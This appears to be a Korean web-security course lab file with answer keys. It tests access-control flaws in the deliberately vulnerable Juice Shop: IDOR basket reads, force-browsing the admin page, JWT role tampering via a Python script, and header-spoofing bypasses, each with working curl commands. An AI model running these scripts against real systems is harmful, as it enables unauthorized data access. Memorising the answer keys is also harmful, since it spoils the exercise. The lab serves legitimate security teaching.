lab_id: standalone-web-vuln-week09
title: "접근제어 점검 — IDOR / 권한 상승 / 인가 우회 (6v6 + R/B/P)"
version: standalone-non-ai
course: web-vuln
week: 9
description: |
  접근제어 (Access Control) 결함 — OWASP A01 (가장 위험한 카테고리) — 의 4 패턴:
  IDOR (Insecure Direct Object Reference), 권한 상승 (privilege escalation),
  인가 우회 (authorization bypass via header tampering), force browse (관리자
  endpoint 직접 접근). JuiceShop 의 의도적 challenge 다수 — basket BOLA, admin
  page 직접 접근, JWT role 변조.
difficulty: medium
duration_minutes: 120
prerequisites:
  - "W04 의 JWT 토큰 + 인증 흐름 이해"
  - "W03 의 정보수집 결과 (/administration, /api/Users 등 발견)"
  - "attacker 의 curl + jq 가용"
objectives:
  - "IDOR — 다른 사용자 의 basket / order 조회 (admin token 변조 X — 단순 ID 변경)"
  - "권한 상승 — JWT 의 role:customer → role:admin 변조 시도 (W11 의 본격 alg=none 은 별도)"
  - "인가 우회 — 헤더 변조 (X-Forwarded-For / X-Real-IP / Bearer 변조)"
  - "force browse — /administration 직접 접근 (인증 없이)"
  - "Red/Blue/Purple — Wazuh dashboard 의 403/401 spike + Purple 의 server-side 인가 검증 권고"
pass_threshold: 0.6
steps:

  - order: 1
    instruction: |
      ## 🎯 MISSION — IDOR (Insecure Direct Object Reference) 시도

      **어디서:** attacker
      **무엇을:** JuiceShop 의 /rest/basket/{id} 같은 endpoint 에 다른 사용자 ID
      로 접근. 본인 token (admin) 으로 다른 user (id=2,3) 의 basket 조회.

      **결과 정리:**
      | basket ID | 응답 코드 | 응답 body 1 줄 | 정상/IDOR 결함 |
      |---|---|---|---|
      | 1 (본인) | | | |
      | 2 | | | |
      | 3 | | | |

      ## 💡 왜?

      IDOR = OWASP A01 의 대표. ID 값 만 변경 으로 타인 데이터 접근 = 가장 흔한
      결함. 운영 환경 의 점검 baseline.

      ## 📋 채점

      - 3 ID 시도 + 응답
      - IDOR 결함 유무 판정 + 학생 1 문장
    hint: "W04 에서 받은 admin JWT token 사용. Authorization: Bearer <token> 헤더."
    category: access_control
    points: 12
    answer: |
      🤖 가이드:
      T=$(curl -s -X POST http://juice.6v6.lab/rest/user/login -H 'Content-Type: application/json' -d '{"email":"admin@juice-sh.op","password":"admin123"}' | jq -r '.authentication.token')
      for id in 1 2 3; do
        code=$(curl -o /tmp/b.out -s -w '%{http_code}' -H "Authorization: Bearer $T" "http://juice.6v6.lab/rest/basket/$id")
        head=$(head -c 100 /tmp/b.out)
        echo "basket $id → $code | $head"
      done
    answer_detail: |
      JuiceShop 의 의도적 challenge: "View Basket" — admin 의 basket 외 다른 user basket 도 접근 가능 = IDOR. 운영 환경 의 user-server 매핑 검증 부재 의 단적 예.
    verify:
      intent: "3 basket ID 시도 + IDOR 판정"
      success_criteria:
        - "3 ID 시도"
        - "응답 인용"
        - "결함 판정 1 문장"
      acceptable_methods:
        - "curl + jq"
      negative_signs:
        - "1 ID 만"
        - "판정 누락"
    target_vm: attacker
    risk_level: medium

  - order: 2
    instruction: |
      ## 🎯 MISSION — Force Browse — /administration 직접 접근

      **어디서:** attacker
      **무엇을:** /administration 경로 에 인증 없이 / customer token 으로 / admin token 으로 3 회 접근 + 응답 차이 분석.

      **결과 정리:**
      | 인증 | 응답 코드 | 응답 body 1 줄 |
      |---|---|---|
      | 없음 | | |
      | customer (다른 계정 등록 후) | | |
      | admin | | |

      ## 📋 채점

      - 3 경우 시도 + 표
      - 학생 분석 1 문장
    hint: "JuiceShop SPA = client-side router. /administration GET 은 항상 HTML 본문 응답 (인증 검증 X). 실제 admin API 호출 시 검증."
    category: access_control
    points: 10
    answer: |
      🤖 가이드:
      curl -s -o /tmp/a.out -w 'no_auth → %{http_code}\n' http://juice.6v6.lab/administration
      head -c 50 /tmp/a.out; echo
      curl -s -o /tmp/a.out -w 'admin token → %{http_code}\n' -H "Authorization: Bearer $T" http://juice.6v6.lab/administration
    answer_detail: |
      JuiceShop SPA 라 /administration 의 HTML 자체 는 200 (router). 실제 admin API (/api/Users 등) 만 401/403. SPA 환경 의 일반 패턴 — server-side authz 가 모든 sensitive API 에 적용 되어야.
    verify:
      intent: "force browse 3 경우 + 응답 차이 분석"
      success_criteria:
        - "3 경우 시도"
        - "응답 차이 표"
        - "분석 1 문장"
      acceptable_methods:
        - "curl"
      negative_signs:
        - "1~2 경우만"
    target_vm: attacker
    risk_level: low

  - order: 3
    instruction: |
      ## 🎯 MISSION — JWT role 변조 시도

      **어디서:** attacker
      **무엇을:** customer 계정 등록 (또는 기존) → JWT 받기 → payload 의
      role:customer 를 role:admin 으로 변조 → 서명 변경 안 함 (W11 의 alg=none 은
      별도) → 변조 token 으로 /api/Users 등 admin endpoint 호출.

      **결과:**
      ```
      원본 JWT payload: <role:customer>
      변조 JWT payload: <role:admin>
      변조 token 으로 /api/Users 호출 응답: <code>
      서명 검증 동작 여부: <성공 의미 = 서명 검증 안 함 / 실패 = 검증 가동>
      ```

      ## 📋 채점
      - 변조 시도 + 응답
      - 서명 검증 결과 분석
    hint: "JWT 변조 = base64url(decoded.payload + role 수정) + 원본 signature 그대로. python 3 line 으로 가능."
    category: access_control
    points: 12
    answer: |
      🤖 가이드:
      # 새 customer 등록
      curl -s -X POST http://juice.6v6.lab/api/Users -H 'Content-Type: application/json' \
        -d '{"email":"test@x.com","password":"Test1234!","passwordRepeat":"Test1234!","securityQuestion":{"id":1},"securityAnswer":"x"}' | head -c 100
      T2=$(curl -s -X POST http://juice.6v6.lab/rest/user/login -H 'Content-Type: application/json' -d '{"email":"test@x.com","password":"Test1234!"}' | jq -r '.authentication.token')
      # payload 변조
      python3 -c "
      import base64, json
      t='$T2'
      h,p,s=t.split('.')
      pad = lambda x: x + '=' * (-len(x) % 4)
      d=json.loads(base64.urlsafe_b64decode(pad(p)))
      d['data']['role']='admin'
      newp=base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
      print(f'{h}.{newp}.{s}')
      " > /tmp/jwt2.txt
      T3=$(cat /tmp/jwt2.txt)
      curl -s -o /dev/null -w 'admin endpoint → %{http_code}\n' -H "Authorization: Bearer $T3" http://juice.6v6.lab/api/Users
    answer_detail: |
      RS256 서명 검증 가동 시 변조 payload 거부 (401). 검증 안 하면 (alg=none 또는 weak secret) 200. JuiceShop 은 일반적으로 RS256 검증 가동 — 401 정상. W11 에서 alg=none 우회 본격.
    verify:
      intent: "JWT role 변조 + 서명 검증 결과 분석"
      success_criteria:
        - "변조 시도"
        - "응답 코드"
        - "서명 검증 결과 분석"
      acceptable_methods:
        - "python base64 또는 jwt_tool"
      negative_signs:
        - "변조 안 함"
        - "응답 누락"
    target_vm: attacker
    risk_level: medium

  - order: 4
    instruction: |
      ## 🎯 MISSION — 헤더 변조 인가 우회 + 보고서 + cleanup

      **어디서:** attacker + 보고서
      **무엇을:**
      1. X-Forwarded-For / X-Real-IP / X-Admin / X-Original-URL 등 헤더 변조 로 admin endpoint 우회 시도
      2. STEP 1~3 + 4 의 결과 통합 markdown (4 finding)
      3. /tmp cleanup

      ## 📋 채점
      - 헤더 변조 3~5 시도
      - 4 finding 통합
      - cleanup
    hint: "curl -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Admin: true' http://juice.6v6.lab/api/Users."
    category: documentation
    points: 12
    answer: |
      🤖 가이드:
      for h in 'X-Forwarded-For: 127.0.0.1' 'X-Real-IP: 127.0.0.1' 'X-Admin: true' 'X-Original-URL: /admin'; do
        code=$(curl -s -o /dev/null -w '%{http_code}' -H "$h" http://juice.6v6.lab/api/Users)
        echo "[$h] → $code"
      done
      rm -f /tmp/b.out /tmp/a.out /tmp/jwt2.txt 2>/dev/null
    answer_detail: |
      운영 환경 의 reverse proxy 가 X-Forwarded-For 신뢰 시 IP 기반 인가 우회 가능. JuiceShop SPA 는 보통 서버측 검증 만 — 헤더 우회 차단.
    verify:
      intent: "헤더 변조 + 4 finding + cleanup"
      success_criteria:
        - "3~5 헤더 변조 시도"
        - "4 finding 통합"
        - "cleanup"
      acceptable_methods:
        - "curl 다양 -H"
      negative_signs:
        - "1~2 헤더만"
        - "cleanup 없음"
    target_vm: attacker
    risk_level: low
